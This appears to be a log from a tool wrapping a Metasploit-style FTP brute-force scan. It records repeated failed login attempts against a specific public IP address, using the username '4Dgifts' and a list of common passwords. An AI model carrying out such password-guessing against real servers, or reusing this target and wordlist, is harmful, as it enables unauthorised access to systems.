2025-10-24 01:43:54,430 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.1%[0m ETA: 155.7s Speed: 0 B/s | 144.3s | PID: 44673
2025-10-24 01:43:55,242 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.4%[0m ETA: 154.9s Speed: 0 B/s | 145.1s | PID: 44673
2025-10-24 01:43:56,044 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.6%[0m ETA: 154.1s Speed: 0 B/s | 145.9s | PID: 44673
2025-10-24 01:43:56,098 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Welcome1234 (Incorrect: )
2025-10-24 01:43:56,848 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.9%[0m ETA: 153.3s Speed: 0 B/s | 146.7s | PID: 44673
2025-10-24 01:43:57,650 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m49.2%[0m ETA: 152.5s Speed: 0 B/s | 147.5s | PID: 44673
2025-10-24 01:43:58,450 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m49.4%[0m ETA: 151.7s Speed: 0 B/s | 148.3s | PID: 44673
2025-10-24 01:43:59,255 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m49.7%[0m ETA: 150.9s Speed: 0 B/s | 149.1s | PID: 44673
2025-10-24 01:43:59,511 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Welcome1212 (Incorrect: )
2025-10-24 01:44:00,057 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m50.0%[0m ETA: 150.1s Speed: 0 B/s | 149.9s | PID: 44673
2025-10-24 01:44:00,858 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m50.2%[0m ETA: 149.3s Speed: 0 B/s | 150.7s | PID: 44673
2025-10-24 01:44:01,661 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m50.5%[0m ETA: 148.5s Speed: 0 B/s | 151.5s | PID: 44673
2025-10-24 01:44:02,462 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m50.8%[0m ETA: 147.7s Speed: 0 B/s | 152.3s | PID: 44673
2025-10-24 01:44:02,664 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:PassSql12 (Incorrect: )
2025-10-24 01:44:03,265 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.0%[0m ETA: 146.9s Speed: 0 B/s | 153.1s | PID: 44673
2025-10-24 01:44:04,065 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.3%[0m ETA: 146.1s Speed: 0 B/s | 153.9s | PID: 44673
2025-10-24 01:44:04,866 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.6%[0m ETA: 145.3s Speed: 0 B/s | 154.7s | PID: 44673
2025-10-24 01:44:05,667 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.8%[0m ETA: 144.5s Speed: 0 B/s | 155.5s | PID: 44673
2025-10-24 01:44:06,262 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:network (Incorrect: )
2025-10-24 01:44:06,469 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.1%[0m ETA: 143.7s Speed: 0 B/s | 156.3s | PID: 44673
2025-10-24 01:44:07,270 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.4%[0m ETA: 142.9s Speed: 0 B/s | 157.1s | PID: 44673
2025-10-24 01:44:08,071 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.6%[0m ETA: 142.1s Speed: 0 B/s | 157.9s | PID: 44673
2025-10-24 01:44:08,873 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.9%[0m ETA: 141.3s Speed: 0 B/s | 158.7s | PID: 44673
2025-10-24 01:44:09,674 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m53.2%[0m ETA: 140.5s Speed: 0 B/s | 159.5s | PID: 44673
2025-10-24 01:44:10,065 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:networking (Incorrect: )
2025-10-24 01:44:10,475 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m53.4%[0m ETA: 139.7s Speed: 0 B/s | 160.3s | PID: 44673
2025-10-24 01:44:11,277 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m53.7%[0m ETA: 138.9s Speed: 0 B/s | 161.1s | PID: 44673
2025-10-24 01:44:12,079 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.0%[0m ETA: 138.1s Speed: 0 B/s | 161.9s | PID: 44673
2025-10-24 01:44:12,880 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.2%[0m ETA: 137.3s Speed: 0 B/s | 162.7s | PID: 44673
2025-10-24 01:44:13,682 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.5%[0m ETA: 136.5s Speed: 0 B/s | 163.5s | PID: 44673
2025-10-24 01:44:13,736 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:networks (Incorrect: )
2025-10-24 01:44:14,484 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.8%[0m ETA: 135.7s Speed: 0 B/s | 164.3s | PID: 44673
2025-10-24 01:44:15,295 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.1%[0m ETA: 134.8s Speed: 0 B/s | 165.2s | PID: 44673
2025-10-24 01:44:16,099 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.3%[0m ETA: 134.0s Speed: 0 B/s | 166.0s | PID: 44673
2025-10-24 01:44:16,900 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.6%[0m ETA: 133.2s Speed: 0 B/s | 166.8s | PID: 44673
2025-10-24 01:44:17,195 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:test (Incorrect: )
2025-10-24 01:44:17,702 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.9%[0m ETA: 132.4s Speed: 0 B/s | 167.6s | PID: 44673
2025-10-24 01:44:18,507 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m56.1%[0m ETA: 131.6s Speed: 0 B/s | 168.4s | PID: 44673
2025-10-24 01:44:19,308 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m56.4%[0m ETA: 130.8s Speed: 0 B/s | 169.2s | PID: 44673
2025-10-24 01:44:20,110 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m56.7%[0m ETA: 130.0s Speed: 0 B/s | 170.0s | PID: 44673
2025-10-24 01:44:20,514 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:testtest (Incorrect: )
2025-10-24 01:44:20,911 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m56.9%[0m ETA: 129.2s Speed: 0 B/s | 170.8s | PID: 44673
2025-10-24 01:44:21,712 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m57.2%[0m ETA: 128.4s Speed: 0 B/s | 171.6s | PID: 44673
2025-10-24 01:44:22,514 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m57.5%[0m ETA: 127.6s Speed: 0 B/s | 172.4s | PID: 44673
2025-10-24 01:44:23,316 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m57.7%[0m ETA: 126.8s Speed: 0 B/s | 173.2s | PID: 44673
2025-10-24 01:44:23,883 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:testing (Incorrect: )
2025-10-24 01:44:24,117 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.0%[0m ETA: 126.0s Speed: 0 B/s | 174.0s | PID: 44673
2025-10-24 01:44:24,919 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.3%[0m ETA: 125.2s Speed: 0 B/s | 174.8s | PID: 44673
2025-10-24 01:44:25,721 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.5%[0m ETA: 124.4s Speed: 0 B/s | 175.6s | PID: 44673
2025-10-24 01:44:26,522 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.8%[0m ETA: 123.6s Speed: 0 B/s | 176.4s | PID: 44673
2025-10-24 01:44:26,996 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:testing123 (Incorrect: )
2025-10-24 01:44:27,328 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.1%[0m ETA: 122.8s Speed: 0 B/s | 177.2s | PID: 44673
2025-10-24 01:44:28,130 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.3%[0m ETA: 122.0s Speed: 0 B/s | 178.0s | PID: 44673
2025-10-24 01:44:28,931 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.6%[0m ETA: 121.2s Speed: 0 B/s | 178.8s | PID: 44673
2025-10-24 01:44:29,733 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.9%[0m ETA: 120.4s Speed: 0 B/s | 179.6s | PID: 44673
2025-10-24 01:44:30,537 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.1%[0m ETA: 119.6s Speed: 0 B/s | 180.4s | PID: 44673
2025-10-24 01:44:31,028 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:testsql (Incorrect: )
2025-10-24 01:44:31,341 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.4%[0m ETA: 118.8s Speed: 0 B/s | 181.2s | PID: 44673
2025-10-24 01:44:32,143 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.7%[0m ETA: 118.0s Speed: 0 B/s | 182.0s | PID: 44673
2025-10-24 01:44:32,944 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.9%[0m ETA: 117.2s Speed: 0 B/s | 182.8s | PID: 44673
2025-10-24 01:44:33,746 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m61.2%[0m ETA: 116.4s Speed: 0 B/s | 183.6s | PID: 44673
2025-10-24 01:44:34,267 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:test-sql3 (Incorrect: )
2025-10-24 01:44:34,547 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m61.5%[0m ETA: 115.6s Speed: 0 B/s | 184.4s | PID: 44673
2025-10-24 01:44:35,349 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m61.7%[0m ETA: 114.8s Speed: 0 B/s | 185.2s | PID: 44673
2025-10-24 01:44:36,152 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.0%[0m ETA: 114.0s Speed: 0 B/s | 186.0s | PID: 44673
2025-10-24 01:44:36,961 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.3%[0m ETA: 113.2s Speed: 0 B/s | 186.8s | PID: 44673
2025-10-24 01:44:37,761 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.5%[0m ETA: 112.4s Speed: 0 B/s | 187.6s | PID: 44673
2025-10-24 01:44:37,906 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlsqlsqlsqlsql (Incorrect: )
2025-10-24 01:44:38,562 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.8%[0m ETA: 111.6s Speed: 0 B/s | 188.4s | PID: 44673
2025-10-24 01:44:39,365 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m63.1%[0m ETA: 110.8s Speed: 0 B/s | 189.2s | PID: 44673
2025-10-24 01:44:40,166 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m63.3%[0m ETA: 110.0s Speed: 0 B/s | 190.0s | PID: 44673
2025-10-24 01:44:40,966 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m63.6%[0m ETA: 109.2s Speed: 0 B/s | 190.8s | PID: 44673
2025-10-24 01:44:41,742 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:bankbank (Incorrect: )
2025-10-24 01:44:41,767 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m63.9%[0m ETA: 108.4s Speed: 0 B/s | 191.6s | PID: 44673
2025-10-24 01:44:42,569 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.1%[0m ETA: 107.6s Speed: 0 B/s | 192.4s | PID: 44673
2025-10-24 01:44:43,370 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.4%[0m ETA: 106.8s Speed: 0 B/s | 193.2s | PID: 44673
2025-10-24 01:44:44,172 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.7%[0m ETA: 106.0s Speed: 0 B/s | 194.0s | PID: 44673
2025-10-24 01:44:44,973 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.9%[0m ETA: 105.2s Speed: 0 B/s | 194.8s | PID: 44673
2025-10-24 01:44:44,989 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:default (Incorrect: )
2025-10-24 01:44:45,774 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m65.2%[0m ETA: 104.4s Speed: 0 B/s | 195.6s | PID: 44673
2025-10-24 01:44:46,575 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m65.5%[0m ETA: 103.6s Speed: 0 B/s | 196.4s | PID: 44673
2025-10-24 01:44:47,376 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m65.7%[0m ETA: 102.8s Speed: 0 B/s | 197.2s | PID: 44673
2025-10-24 01:44:48,177 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m66.0%[0m ETA: 102.0s Speed: 0 B/s | 198.0s | PID: 44673
2025-10-24 01:44:48,459 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:test (Incorrect: )
2025-10-24 01:44:48,978 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m66.3%[0m ETA: 101.2s Speed: 0 B/s | 198.8s | PID: 44673
2025-10-24 01:44:49,779 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m66.5%[0m ETA: 100.4s Speed: 0 B/s | 199.6s | PID: 44673
2025-10-24 01:44:50,580 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m66.8%[0m ETA: 99.6s Speed: 0 B/s | 200.4s | PID: 44673
2025-10-24 01:44:51,381 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.1%[0m ETA: 98.8s Speed: 0 B/s | 201.2s | PID: 44673
2025-10-24 01:44:51,686 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:testing (Incorrect: )
2025-10-24 01:44:52,184 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.3%[0m ETA: 98.0s Speed: 0 B/s | 202.0s | PID: 44673
2025-10-24 01:44:52,985 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.6%[0m ETA: 97.2s Speed: 0 B/s | 202.8s | PID: 44673
2025-10-24 01:44:53,787 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.9%[0m ETA: 96.4s Speed: 0 B/s | 203.6s | PID: 44673
2025-10-24 01:44:54,588 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m68.2%[0m ETA: 95.5s Speed: 0 B/s | 204.5s | PID: 44673
2025-10-24 01:44:55,030 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:password2 (Incorrect: )
2025-10-24 01:44:55,393 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m68.4%[0m ETA: 94.7s Speed: 0 B/s | 205.3s | PID: 44673
2025-10-24 01:44:56,194 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m68.7%[0m ETA: 93.9s Speed: 0 B/s | 206.1s | PID: 44673
2025-10-24 01:44:56,996 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m69.0%[0m ETA: 93.1s Speed: 0 B/s | 206.9s | PID: 44673
2025-10-24 01:44:57,797 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m69.2%[0m ETA: 92.3s Speed: 0 B/s | 207.7s | PID: 44673
2025-10-24 01:44:58,197 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts: (Incorrect: )
2025-10-24 01:44:58,602 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m69.5%[0m ETA: 91.5s Speed: 0 B/s | 208.5s | PID: 44673
2025-10-24 01:44:59,403 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m69.8%[0m ETA: 90.7s Speed: 0 B/s | 209.3s | PID: 44673
2025-10-24 01:45:00,205 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m70.0%[0m ETA: 89.9s Speed: 0 B/s | 210.1s | PID: 44673
2025-10-24 01:45:01,008 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m70.3%[0m ETA: 89.1s Speed: 0 B/s | 210.9s | PID: 44673
2025-10-24 01:45:01,777 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:password (Incorrect: )
2025-10-24 01:45:01,808 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m70.6%[0m ETA: 88.3s Speed: 0 B/s | 211.7s | PID: 44673
2025-10-24 01:45:02,610 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m70.8%[0m ETA: 87.5s Speed: 0 B/s | 212.5s | PID: 44673
2025-10-24 01:45:03,411 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.1%[0m ETA: 86.7s Speed: 0 B/s | 213.3s | PID: 44673
2025-10-24 01:45:04,213 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.4%[0m ETA: 85.9s Speed: 0 B/s | 214.1s | PID: 44673
2025-10-24 01:45:05,016 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.6%[0m ETA: 85.1s Speed: 0 B/s | 214.9s | PID: 44673
2025-10-24 01:45:05,111 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Password1 (Incorrect: )
2025-10-24 01:45:05,818 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.9%[0m ETA: 84.3s Speed: 0 B/s | 215.7s | PID: 44673
2025-10-24 01:45:06,619 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m72.2%[0m ETA: 83.5s Speed: 0 B/s | 216.5s | PID: 44673
2025-10-24 01:45:07,420 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m72.4%[0m ETA: 82.7s Speed: 0 B/s | 217.3s | PID: 44673
2025-10-24 01:45:08,221 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m72.7%[0m ETA: 81.9s Speed: 0 B/s | 218.1s | PID: 44673
2025-10-24 01:45:08,316 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Password1! (Incorrect: )
2025-10-24 01:45:09,023 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m73.0%[0m ETA: 81.1s Speed: 0 B/s | 218.9s | PID: 44673
2025-10-24 01:45:09,825 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m73.2%[0m ETA: 80.3s Speed: 0 B/s | 219.7s | PID: 44673
2025-10-24 01:45:10,626 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m73.5%[0m ETA: 79.5s Speed: 0 B/s | 220.5s | PID: 44673
2025-10-24 01:45:11,427 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m73.8%[0m ETA: 78.7s Speed: 0 B/s | 221.3s | PID: 44673
2025-10-24 01:45:11,966 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:P@ssw0rd (Incorrect: )
2025-10-24 01:45:12,228 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.0%[0m ETA: 77.9s Speed: 0 B/s | 222.1s | PID: 44673
2025-10-24 01:45:13,030 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.3%[0m ETA: 77.1s Speed: 0 B/s | 222.9s | PID: 44673
2025-10-24 01:45:13,832 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.6%[0m ETA: 76.3s Speed: 0 B/s | 223.7s | PID: 44673
2025-10-24 01:45:14,633 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.8%[0m ETA: 75.5s Speed: 0 B/s | 224.5s | PID: 44673
2025-10-24 01:45:15,145 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:password12 (Incorrect: )
